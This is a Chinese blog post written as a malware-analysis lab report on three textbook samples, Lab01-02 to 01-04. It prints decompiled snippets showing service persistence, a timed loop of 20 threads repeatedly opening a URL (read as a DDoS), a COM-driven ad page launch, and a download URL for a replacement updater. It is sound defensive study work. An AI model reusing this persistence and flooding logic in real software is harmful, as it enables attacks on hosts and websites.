@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>恶意代码分析实战lab01-2/3/4 | ylylhl&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="堆一下实验报告">
+<meta name="keywords" content="逆向">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意代码分析实战lab01-2&#x2F;3&#x2F;4">
+<meta property="og:url" content="http://ylylhl.github.io/2019/03/31/恶意代码分析实战lab01/index.html">
+<meta property="og:site_name" content="ylylhl&#39;s blog">
+<meta property="og:description" content="堆一下实验报告">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-0b03b4a72e99b40a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-1137ae4573b0448c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-a5c0b80c9b1cd73a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-f59cbde0cf3c371a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-d5f273dd9fb72920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-4b9ad8d655978352.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-2d116d70c00100e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-5dec2ba9a662ee0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-f8d1af90e054811f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-e028ad275d42ebdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-f4f9118a56c937f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-806fdbb648897cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-38317599ade7672e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-933a2785316f6795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-61265ce3274660ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-29172d6109c94af3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-d3d01043e5df6dc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-0eeaa5b0b0120e91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-4676013c66fa0ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-71bca6e7692fd9d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-e33a1c3920684a6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-b9987d267594c5e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-e3ca5bc8f69d7810.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-c946db7da751699e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-32b97b19faa3f059.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-dd77ae279adef2a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-93cc9081e5ec1c50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-b4e3c261e43a1fab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-91442febf445a3ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-637106054d6f172d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-a2002343d7abea0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/10480445-c39496eeb792a309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-04-10T08:34:47.065Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="恶意代码分析实战lab01-2&#x2F;3&#x2F;4">
+<meta name="twitter:description" content="堆一下实验报告">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/10480445-0b03b4a72e99b40a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: false,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img src="/img/head.png" class="js-avatar" style="width: 100%;height: 100%;opacity: 1;">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title>ylylhl</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">明日のメダルと掴む腕</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="search" placeholder=" Search...">
+            </form>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">-首页-</a></li>
+                        
+                            <li><a href="/archives">-归档-</a></li>
+                        
+                            <li><a href="/about">-关于-</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=laKtpKWmpaKspdXk5Lv2_vg" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/ylylhl" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="https://weibo.com/u/5655801541" title="weibo">weibo</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Android逆向/" style="font-size: 10px;">Android逆向</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/机器学习/" style="font-size: 20px;">机器学习</a> <a href="/tags/汉化/" style="font-size: 10px;">汉化</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://obolu.github.io/">obolu的小博客</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">日常摸鱼，长期搬砖，ygo娱乐玩家，来打只看不产，布鲁游天下第一。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">ylylhl</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img src="/img/head.png" class="js-avatar" style="width: 100%; height: 100%; opacity: 1;">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">ylylhl</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">明日のメダルと掴む腕</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">-首页-</a></li>
+                
+                    <li><a href="/archives">-归档-</a></li>
+                
+                    <li><a href="/about">-关于-</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=laKtpKWmpaKspdXk5Lv2_vg" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/ylylhl" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/5655801541" title="weibo">weibo</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-恶意代码分析实战lab01" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/31/恶意代码分析实战lab01/" class="article-date">
+      <time datetime="2019-03-31T03:37:00.000Z" itemprop="datePublished">2019-03-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      恶意代码分析实战lab01-2/3/4
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/杂物堆积/">杂物堆积</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><excerpt in index | 首页摘要><br>堆一下实验报告<br><a id="more"></a></excerpt></p>
+<p><the rest of contents | 余下全文></the></p>
+<h3 id="Lab-01-2"><a href="#Lab-01-2" class="headerlink" title="Lab_01_2"></a>Lab_01_2</h3><h4 id="在线反病毒扫描"><a href="#在线反病毒扫描" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，大部分引擎将该文件识别为恶意程序。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-0b03b4a72e99b40a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>此外，在Behavior选项卡下可以看到，该程序将会创建一个名为Malservice的服务和名为HGL345的互斥体。</p>
+<h4 id="PEiD"><a href="#PEiD" class="headerlink" title="PEiD"></a>PEiD</h4><p>由PEiD分析可知加了UPX壳。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-1137ae4573b0448c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>upx源代码已由upx.sourceforge.net搬至<a href="https://github.com/upx/upx/releases" target="_blank" rel="noopener">github</a>，下载工具，脱壳得到lab-01-02-new.exe，后续分析均基于此文件进行。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-a5c0b80c9b1cd73a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>再次拖入PEiD，发现脱壳成功。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-f59cbde0cf3c371a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>、<code>WININET.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-d5f273dd9fb72920.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>查看字符串，发现存在网址<code>http:///www.malwareanalysisbook.com</code>和<code>Internet Exploer 8.0</code>字样，初步猜测程序会使用IE浏览器打开该网址。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-4b9ad8d655978352.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-2d116d70c00100e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>需要注意的函数如下：</p>
+<ul>
+<li>KERNEL32.dll<ul>
+<li>OpenMutexA</li>
+<li>CreateMutexA</li>
+<li>CreateThread</li>
+</ul>
+</li>
+<li>ADVAPI32.dll<ul>
+<li>CreateServiceA</li>
+<li>StartServiceCtrlDispatcherA</li>
+<li>OpenSCManagerA</li>
+</ul>
+</li>
+<li>WININET.dll<ul>
+<li>InternetOpenA</li>
+<li>InternetOpenUrlA</li>
+</ul>
+</li>
+</ul>
+<p>可以看出该程序将会创建进程、服务和线程，并打开某个网址，进一步证实了之前的猜测。</p>
+<h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p>用ida打开文件，F5反汇编，截取部分代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main()</span></span><br><span class="line">  ServiceStartTable.lpServiceName = aMalservice;</span><br><span class="line">  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  StartServiceCtrlDispatcherA(&amp;ServiceStartTable);</span><br><span class="line">  <span class="keyword">return</span> sub_401040();</span><br></pre></td></tr></table></figure>
+<p>其中<code>aMalservice</code>的取值如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-5dec2ba9a662ee0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sub_401040()</span></span><br><span class="line">  <span class="keyword">if</span> ( OpenMutexA(<span class="number">0x1F0001</span>u, <span class="number">0</span>, Name) )<span class="comment">//若已存在则不再创建</span></span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  CreateMutexA(<span class="number">0</span>, <span class="number">0</span>, Name);<span class="comment">//若不存在，则创建一个互斥体，保证只执行一次</span></span><br><span class="line">  v0 = OpenSCManagerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x3E8</span>u);</span><br><span class="line">  CreateServiceA(v0, DisplayName, DisplayName, <span class="number">2u</span>, <span class="number">0x10</span>u, <span class="number">2u</span>, <span class="number">0</span>, &amp;Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建服务</span></span><br><span class="line"> （省略部分代码）</span><br><span class="line">  SystemTime.wYear = <span class="number">2100</span>;<span class="comment">//设定时间，到该时间后执行代码</span></span><br><span class="line">  SystemTimeToFileTime(&amp;SystemTime, &amp;FileTime);</span><br><span class="line">  v1 = CreateWaitableTimerA(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建计时器</span></span><br><span class="line">  SetWaitableTimer(v1, (<span class="keyword">const</span> LARGE_INTEGER *)&amp;FileTime, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//激活计时器</span></span><br><span class="line">  <span class="keyword">if</span> ( WaitForSingleObject(v1, <span class="number">0xFFFFFFFF</span>) )<span class="comment">//等待触发</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//如果系统时间到了2100年</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">do</span><span class="comment">//建立20个线程</span></span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      --v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 );</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>Displayname</code>和<code>Name</code>的取值如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-f8d1af90e054811f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//StartAddress()</span></span><br><span class="line">  <span class="keyword">for</span> ( i = InternetOpenA(szAgent, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); ; InternetOpenUrlA(i, szUrl, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80000000</span>, <span class="number">0</span>) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
+<p>其中<code>InternetOpenA()</code>和<code>InternetOpenUrlA()</code>的参数分别如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-e028ad275d42ebdd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该恶意程序的目的是创建一个名为Malservice的服务，并在2100年时创建20个线程，使用IE浏览器打开指定网址，推测编写者想要集中在同一时间对该网站进行DDoS攻击。</p>
+<h3 id="Lab-01-3"><a href="#Lab-01-3" class="headerlink" title="Lab_01_3"></a>Lab_01_3</h3><h4 id="在线反病毒扫描-1"><a href="#在线反病毒扫描-1" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，绝大部分引擎将该文件识别为恶意程序。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-f4f9118a56c937f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>此外，在Behavior选项卡下可以看到，该程序将会向特定网址发出请求，并和两个未知IP间产生网络流量。它还会打开、写入、删除一些文件；打开并设置部分注册表项；创建一些进程；输入shell命令等，不再逐一截图。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-806fdbb648897cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-38317599ade7672e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="PEiD-1"><a href="#PEiD-1" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，易知加了FSG v1.0的壳。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-933a2785316f6795.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>搜索了脱壳教程，步骤如下：</p>
+<ol>
+<li>拖入ollydbg，选择<code>插件-&gt;OllyDump-&gt;跨段查找脱壳程序的OEP（遇到call就跳过）</code>，<code>Ctrl+A</code>分析代码，得到地址如下：</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-61265ce3274660ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<ol start="2">
+<li>选择<code>插件-&gt;OllyDump-&gt;脱壳在当前调试的进程</code>，点击<code>获取EIP作为OEP</code>，选择脱壳，另存为lab01-03-new.exe。</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-29172d6109c94af3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>拖入PEiD，可以看到脱壳成功，后续分析均基于lab01-03-new.exe进行。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-d3d01043e5df6dc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>可以看到该程序调用了<code>oleaut32.dll</code>、<code>ole32.dll</code>、<code>msvcrt.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-0eeaa5b0b0120e91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="Dependency-Walker-1"><a href="#Dependency-Walker-1" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h4><p>拖入Dependency Walker，界面如图所示。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-4676013c66fa0ad7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<ul>
+<li>ole32.dll<ul>
+<li>OleInitialize</li>
+<li>CoCreateInstance</li>
+<li>OleUninitialize</li>
+</ul>
+</li>
+</ul>
+<h4 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h4><p>打开lab01-03-new.exe，F5反汇编，截取部分代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( OleInitialize(<span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  CoCreateInstance(&amp;rclsid, <span class="number">0</span>, <span class="number">4u</span>, &amp;riid, &amp;ppv);</span><br><span class="line">  <span class="keyword">if</span> ( ppv )</span><br><span class="line">  &#123;</span><br><span class="line">    VariantInit(&amp;pvarg);</span><br><span class="line">    v7 = <span class="number">3</span>;</span><br><span class="line">    v8 = <span class="number">1</span>;</span><br><span class="line">    v3 = SysAllocString(<span class="string">L"http://www.malwareanalysisbook.com/ad.html"</span>);</span><br><span class="line">    (*(<span class="keyword">void</span> (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + <span class="number">44</span>))(</span><br><span class="line">      ppv,</span><br><span class="line">      v3,</span><br><span class="line">      &amp;v7,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg,</span><br><span class="line">      &amp;pvarg);</span><br><span class="line">    SysFreeString(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  OleUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h4><p>综合上述分析，可以得知该程序的主要目的是打开特定网址，该网址可能含有恶意代码。</p>
+<h3 id="Lab-01-4"><a href="#Lab-01-4" class="headerlink" title="Lab_01_4"></a>Lab_01_4</h3><h4 id="在线反病毒扫描-2"><a href="#在线反病毒扫描-2" class="headerlink" title="在线反病毒扫描"></a>在线反病毒扫描</h4><p>在<a href="www.virustotal.com">www.virustotal.com</a>的扫描结果中，大部分引擎将该文件识别为恶意程序。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-71bca6e7692fd9d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>此外，在Behavior选项卡下可以看到，该程序将会请求特定网址，与未知IP建立TCP连接；移动wupdmgr.exe并写入；运行wupdmgr.exe以创建进程；开启服务等，不再逐一截图。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-e33a1c3920684a6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-b9987d267594c5e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-e3ca5bc8f69d7810.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h4 id="PEiD-2"><a href="#PEiD-2" class="headerlink" title="PEiD"></a>PEiD</h4><p>拖入PEiD，看到加了UPX壳。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-c946db7da751699e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>惯例脱壳，后续分析均基于脱壳后的lab01-04-new.exe进行。<br>将脱壳后的exe拖入PEiD，发现可以看到详细信息，证明脱壳成功。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-32b97b19faa3f059.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>可以看到该程序调用了<code>KRENEL32.dll</code>、<code>ADVAPI32.dll</code>、<code>MSVCRT.dll</code>，其中需要注意的函数将在Dependency Walker部分说明。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-dd77ae279adef2a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>转换时间戳得知该程序的编译时间是2019年8月30日，明显经过了篡改。<br>此外，该程序还包含了一个资源，具体分析详见Resource Hacker部分。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-93cc9081e5ec1c50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10480445-b4e3c261e43a1fab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>查看字符串，可以发现<code>\winup.exe</code>、<code>\system32\wupdmgrd.exe</code>和<code>http:///www.practicalmalwareanalysis.com/updater.exe</code>等字样，其中wupdmgr.exe是电脑系统自动升级的程序文件，初步推测程序将会从指定网址下载更新器，并存为winup.exe或替换wupdmgrd.exe，实际情况仍有待进一步分析。</p>
